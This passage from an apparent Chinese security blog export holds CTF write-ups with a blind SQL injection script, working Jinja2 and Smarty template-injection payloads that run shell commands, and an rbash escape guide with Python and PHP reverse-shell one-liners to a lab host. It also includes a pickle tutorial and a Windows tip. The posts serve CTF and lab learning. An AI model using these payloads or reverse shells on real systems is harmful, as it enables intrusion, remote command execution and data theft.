class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Infolen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (columnname, tablename, i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of Info is : %s&quot;</span> % <span class="built_in">chr</span>(j))  </span><br><span class="line">                Info += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the Info is : %s&quot;</span> % Info)  </span><br><span class="line">    <span class="keyword">return</span> Info  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    url = <span class="string">&#x27;http://2f0a7c25-26c9-43ff-8aac-7afda31cb1f7.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line">    dblen = lenOfdb(url)  </span><br><span class="line">    db = dbName(url, dblen)  </span><br><span class="line">    tableslen = tablesLen(url, db)  </span><br><span class="line">    tablesTable = tablesName(url, <span class="string">&#x27;ctf&#x27;</span>, tableslen).split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(tablesTable)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;选择要查的表：(输入数字，从0开始)&quot;</span>)  </span><br><span class="line">    tIndex = <span class="built_in">int</span>(<span class="built_in">input</span>())  </span><br><span class="line">    columnlen = columnsLen(url, tablesTable[tIndex])  </span><br><span class="line">    columnsTable = columnsName(url, tablesTable[tIndex], columnlen).split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(columnsTable)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;选择要查的字段：(输入数字，从0开始)&quot;</span>)  </span><br><span class="line">    cIndex = <span class="built_in">int</span>(<span class="built_in">input</span>())  </span><br><span class="line">    infolen = InfoLen(url, tablesTable[tIndex], columnsTable[cIndex])  </span><br><span class="line">    getInfo(url, tablesTable[tIndex], columnsTable[cIndex], infolen)</span><br></pre></td></tr></table></figure></p>
<p><strong>需要注意的是flag在flag表内的value字段下，而不在flag字段下</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>布尔盲注</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_SSTI_2</title>
    <url>/2022/04/05/bugku_SSTI_2/</url>
    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
<span id="more"></span>
<h1 id="题目信息">1 题目信息</h1>
<p>进入环境。得到提示信息 <code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
<p>因此判断模板引擎是Jinjia2或者是flask。</p>
<h1 id="解题">2 解题</h1>
<p>输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>接下来共有4种方法</p>
<ul>
<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p>方法2</p></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方法3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Jinjia2</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_聪明的php</title>
    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
<p>随便给一个参数，得到如下界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现关键词<code>smarty</code>。</p>
<h1 id="解题">解题</h1>
<p>本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
<p>版本为3.1。</p>
<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
<h2 id="命令执行">命令执行</h2>
<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
<h2 id="if标签">{if}标签</h2>
<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Smarty</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle 库</title>
    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
    <content><![CDATA[<p>pickle 库的简单使用。</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
<h1 id="介绍">介绍</h1>
<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
<h1 id="常用方法">常用方法</h1>
<p>主要由两类接口，即序列化和反序列化。</p>
<p>其中序列化包括： 1. dump() 2. dumps()</p>
<p>反序列化包括： 1. load() 2. loads()</p>
<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
<h2 id="dump">dump</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
</blockquote>
<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
<h2 id="dumps">dumps</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - obj：要序列化的对象 - 少了 file</p>
<ul>
<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
</ul>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
<h2 id="load">load</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="loads">loads</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>rbash 逃逸</title>
    <url>/2022/05/11/rbash%20%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>个人的知识点总结。</p>
<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>rbash是 Restricted Bash 的缩写，即受限制的bash。管理员可以通过指定其他用户的bash为rbash，以此来限制用户的相关操作。在rbash中，很多操作和命令都会受到限制，比如：</p>
<ol type="1">
<li>使用cd更改目录；</li>
<li>设置或者取消环境变量的设置；</li>
<li>指定包含参数 / 的文件名。也就是不能够执行一些文件；</li>
<li>指定包含参数 - 的文件名；</li>
<li>使用重定向输出 &gt;, &gt;&gt;, &gt;|, &lt;&gt;, &gt;&amp;, &amp;&gt; 等</li>
</ol>
<p>因此，在渗透过程中，获得一个rbash对后续的操作会影响到后面的操作，所以才需要绕过rbash。</p>
<h1 id="绕过方法">2. 绕过方法</h1>
<p>使用的环境很简单，为 Ubuntu20.04 LTS。</p>
<p>首先输入如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduer [username]</span><br></pre></td></tr></table></figure></p>
<p>然后按照提示输入相关信息即可创建一个新用户。</p>
<p>接着，修改/etc/passwd。将新建的用户的/bin/bash 修改为/bin/rbash</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154143.png" /></p>
<p>此时，m1ku的bash则为rbash，不能执行一些操作，比如切换到根目录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154226.png" /></p>
<p>hacking articls 中提出 <strong>Method to Bypass rbash</strong>:</p>
<ol type="1">
<li>Bypass rbash using Editors
<ol type="1">
<li>vi-editors</li>
<li>Ed-editors</li>
</ol></li>
<li>Bypass rbahs using One Liner
<ol type="1">
<li>Python</li>
<li>Perl</li>
<li>Awk</li>
</ol></li>
<li>Bypass rbash using througn Reverser Shell</li>
<li>Bypass rbash using Sytem binaries
<ol type="1">
<li>More</li>
<li>Less</li>
<li>Man</li>
</ol></li>
<li>Bypass rbash using Expect</li>
<li>Bypass rbash using SSH</li>
</ol>
<p>将rbash的绕过分成了6个部分：</p>
<ol type="1">
<li>使用Linux的vi或者ed编辑器，执行一个新的shell；</li>
<li>使用一种语言来执行命令，返回一个无限制的shell；比如python中的os库来执行/bin/bash</li>
<li>使用系统命令或者php之类的额，反弹一个系统shel到攻击主机上；</li>
<li>利用系统中的二进制文件来绕过，这里给出的为more, less, man；</li>
<li>利用 expect 绕过</li>
<li>利用 ssh 绕过</li>
</ol>
<h2 id="编辑器绕过">2.1. 编辑器绕过</h2>
<h3 id="vivim">2.1.1. vi/vim</h3>
<p>进入到 vi/vim 中将设立了修改为/bin/bash，命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. vim</span><br><span class="line">2. :<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">3. :shell</span><br></pre></td></tr></table></figure></p>
<p>后两条命令需要在vi/vim的命令模式下输入</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154432.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154449.png" /></p>
<p>此时，虽然显示还是rbash，但是已经可以正常的进行相关操作了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154538.png" /></p>
<p>原理：就是利用 vi/vim 启动了一个shell的进程，该shell为/bin/bash。</p>
<h3 id="ed">2.1.2. ed</h3>
<p>命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ed</span><br><span class="line">2. !/bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511155329.png" /></p>
<h2 id="编程语言绕过">2.2. 编程语言绕过</h2>
<h3 id="python">2.2.1. Python</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511155602.png" /></p>
<p>也可以使用python获得交互式shell的命令来绕过： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="perl">2.2.2. Perl</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511155850.png" /></p>
<h3 id="awk">2.2.3. Awk</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511160020.png" /></p>
<h2 id="反弹shell绕过">2.3. 反弹shell绕过</h2>
<h3 id="python-反弹">2.3.1. Python 反弹</h3>
<p>首先在kali上监听端口： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>然后，在要绕过的主机上执行下面命令：（IP和端口为kali的） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511160553.png" /></p>
<h3 id="php-反弹">2.3.2. PHP 反弹</h3>
<p>同上，不过是反弹shell命令不同罢了。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.2.4&quot;,3333);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="二进制文件绕过">2.4. 二进制文件绕过</h2>
<p>使用该方法是有条件的，那就是当前目录下需要有可以读的文件。不过一般都能满足，因为一般情况下，家目录下都会有 .bashrc 这样的文件。</p>
<h3 id="more">2.4.1. more</h3>
<p>使用的条件比较苛刻：</p>
<ol type="1">
<li>要么文件内容很多，一个屏幕显示不全</li>
<li>我们自己把命令行的窗口调小，或者利用stty将显示的行数减少</li>
</ol>
<p>总之，就是不能让内容显示全即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. more filename</span><br><span class="line">2. !<span class="string">&#x27;bash&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162726.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162739.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162751.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162810.png" /></p>
<h3 id="less">2.4.2. less</h3>
<p>该命令就没有more的限制。直接输入如下命令即可： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. less filename</span><br><span class="line">2. !<span class="string">&#x27;bash&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162952.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511163018.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511163034.png" /></p>
<h3 id="man">2.4.3. man</h3>
<p>该方法不需要有可读文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. man man</span><br><span class="line">2. !<span class="string">&#x27;bash&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="expect-绕过">2.5. expect 绕过</h2>
<p>expect是免费的编程工具，用来实现自动的交互式任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. expect</span><br><span class="line">2. bash</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511163535.png" /></p>
<h2 id="ssh-绕过">2.6. SSH 绕过</h2>
<p>使用该方法的条件：</p>
<ol type="1">
<li>开启ssh服务</li>
<li>知道用户的密码</li>
</ol>
<p>命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh m1ku@10.0.2.21 -t <span class="string">&quot;bash --noprofile&quot;</span></span><br><span class="line">2. 输入密码即可</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511164041.png" /></p>
<h2 id="sh-bash-zsh-dash-绕过">2.7. sh, bash, zsh, dash 绕过</h2>
<p>如果主机上存在其他的shell，比如说sh，bash，zsh，这是比较常见三种，就可以直接输入： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh</span><br></pre></td></tr></table></figure></p>
<p>或者 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash</span><br></pre></td></tr></table></figure></p>
<p>或者 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsh</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511164409.png" /></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>rbash逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 上CD驱动器的删除问题</title>
    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
<span id="more"></span>
<h1 id="问题描述">问题描述</h1>
<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
<p>删除也删不掉，打开也打开不了，很烦。</p>
<h1 id="原因">原因</h1>
<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
<p>知道原因后，解决的办法就很简单了。</p>
<h1 id="问题解决">问题解决</h1>
<p>首先，以管理员方式打开 <code>UltraISO</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
<p><code>选项 -&gt; 配置</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
<p>然后即可看到 CD驱动器已经消失了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows小知识</tag>
      </tags>
  </entry>
  <entry>
    <title>python challenge 题解</title>
